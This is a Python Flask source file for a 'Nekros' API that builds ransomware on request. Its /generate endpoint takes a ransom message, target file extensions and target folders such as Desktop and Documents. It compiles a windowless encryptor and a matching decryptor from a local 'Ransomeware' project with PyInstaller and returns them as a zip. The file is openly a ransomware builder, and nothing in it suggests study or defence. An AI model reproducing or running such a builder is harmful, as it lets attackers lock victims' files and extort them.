import os
import shutil
import tempfile
import subprocess
import zipfile
from flask import Flask, request, jsonify, send_file

app = Flask(__name__)

@app.route('/')
def hello_world():
    return 'This is the Nekros executable generation API.'

@app.route('/generate', methods=['POST'])
def generate_executables():
    data = request.get_json()
    if not data:
        return jsonify({"error": "Invalid JSON"}), 400

    message = data.get('message', 'Your files have been encrypted!')
    extensions = data.get('extensions', ['.lol', '.mrrobot'])
    directories = data.get('directories', ['Desktop', 'Downloads', 'Documents'])

    if not isinstance(extensions, list) or not isinstance(directories, list):
        return jsonify({"error": "extensions and directories must be lists"}), 400

    try:
        # Create a temporary directory
        with tempfile.TemporaryDirectory() as tmpdir:
            ransomeware_src_path = os.path.abspath('Ransomeware')
            tmp_ransomeware_path = os.path.join(tmpdir, 'Ransomeware')
            shutil.copytree(ransomeware_src_path, tmp_ransomeware_path)

            # --- Generate Encryptor ---
            encryptor_script_path = os.path.join(tmp_ransomeware_path, 'main.py')
            pyinstaller_encryptor_cmd = [
                'pyinstaller',
                '--onefile',
                '--noconsole',
                encryptor_script_path,
                '--',
                '--message', message,
                '--extensions', *extensions,
                '--directories', *directories,
            ]
            subprocess.run(pyinstaller_encryptor_cmd, check=True, cwd=tmp_ransomeware_path)

            # --- Generate Decryptor ---
            decryptor_script_path = os.path.join(tmp_ransomeware_path, 'reverse_attack.py')
            pyinstaller_decryptor_cmd = [
                'pyinstaller',
                '--onefile',
                decryptor_script_path,
            ]
            subprocess.run(pyinstaller_decryptor_cmd, check=True, cwd=tmp_ransomeware_path)

            # --- Zip the executables ---
            # Note: PyInstaller on Linux creates a Linux executable, not a Windows .exe
            # This will need to be run on a Windows machine to create a .exe
            encryptor_exe_name = 'main'
            decryptor_exe_name = 'reverse_attack'
            encryptor_exe_path = os.path.join(tmp_ransomeware_path, 'dist', encryptor_exe_name)
            decryptor_exe_path = os.path.join(tmp_ransomeware_path, 'dist', decryptor_exe_name)

            zip_path = os.path.join(tmpdir, 'executables.zip')
            with zipfile.ZipFile(zip_path, 'w') as zipf:
                zipf.write(encryptor_exe_path, arcname='encryptor')
                zipf.write(decryptor_exe_path, arcname='decryptor')

            return send_file(zip_path, as_attachment=True)

    except subprocess.CalledProcessError as e:
        return jsonify({"error": "PyInstaller failed", "details": str(e)}), 500
    except Exception as e:
        return jsonify({"error": "An unexpected error occurred", "details": str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True, port=7860)
